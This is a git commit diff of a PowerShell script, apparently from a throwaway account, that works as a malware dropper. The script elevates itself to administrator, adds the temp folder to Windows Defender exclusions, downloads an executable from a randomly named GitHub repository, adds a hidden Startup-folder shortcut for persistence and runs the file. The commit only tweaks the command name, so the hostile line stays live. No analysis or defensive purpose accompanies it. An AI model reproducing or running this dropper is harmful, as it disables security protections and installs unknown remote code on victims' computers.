0109bfc2a26ecaccabe13630a9afa62380b75fdd
greetjerry098-web <greetjerry098@gmail.com>
2026-01-09 14:00:33 -0700

    Update a.ps1

--- a.ps1
+++ a.ps1
@@ -7,4 +7,4 @@ if (-not ([Security.Principal.WindowsPrincipal] `
     Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
     exit
 }
-cmd /c "powershell.exe Add-MpPreference -ExclusionPath '%temp%' & curl.exe -L -o "%TEMP%\s.exe" "https://raw.githubusercontent.com/greetjerry098-web/ahkwfjealyfusdiflwejk/refs/heads/main/s.exe" && powershell -w h -c "$s=(New-Object -ComObject WScript.Shell).CreateShortcut(\"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\s.lnk\");$s.TargetPath=\"$env:TEMP\s.exe\";$s.Save()" && start "" "%TEMP%\s.exe""
+cmd.exe /c "powershell.exe Add-MpPreference -ExclusionPath '%temp%' & curl.exe -L -o "%TEMP%\s.exe" "https://raw.githubusercontent.com/greetjerry098-web/ahkwfjealyfusdiflwejk/refs/heads/main/s.exe" && powershell -w h -c "$s=(New-Object -ComObject WScript.Shell).CreateShortcut(\"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\s.lnk\");$s.TargetPath=\"$env:TEMP\s.exe\";$s.Save()" && start "" "%TEMP%\s.exe""
